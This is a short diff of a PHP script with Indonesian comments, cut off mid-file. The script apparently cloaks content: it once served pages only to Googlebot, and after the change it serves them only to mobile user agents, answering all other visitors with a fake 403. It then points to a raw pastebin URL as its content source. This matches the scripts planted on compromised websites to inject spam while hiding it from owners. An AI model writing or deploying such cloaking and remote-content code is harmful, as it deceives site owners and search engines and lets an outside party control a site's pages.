@@ -1,14 +1,14 @@
 <?php
+// Cek jika ada parameter 'post'
 if (isset($_GET['post'])) {
-    // Deteksi apakah pengunjung adalah robot Google (desktop atau smartphone)
-    $is_googlebot = preg_match('/Googlebot/i', $_SERVER['HTTP_USER_AGENT']);
-    $is_googlebot_smartphone = preg_match('/Googlebot.*Mobile/i', $_SERVER['HTTP_USER_AGENT']);
+    // Deteksi apakah pengunjung adalah perangkat seluler
+    $is_mobile = preg_match('/Mobile|Android|iPhone|iPad/i', $_SERVER['HTTP_USER_AGENT']);
 
-    if (!$is_googlebot && !$is_googlebot_smartphone) {
-        // Jika bukan robot Google, tampilkan halaman kosong atau pesan
+    if (!$is_mobile) {
+        // Jika bukan perangkat seluler, tampilkan halaman kosong atau pesan
         header("HTTP/1.1 403 Forbidden");
         echo "<h1>403 Forbidden</h1>";
-        echo "<p>Konten ini hanya untuk robot pencari Google.</p>";
+        echo "<p>Konten ini hanya dapat diakses dari perangkat seluler.</p>";
         exit; // Hentikan eksekusi lebih lanjut
     }
     $filename = "https://pastebin.com/raw/mqCJTET3";
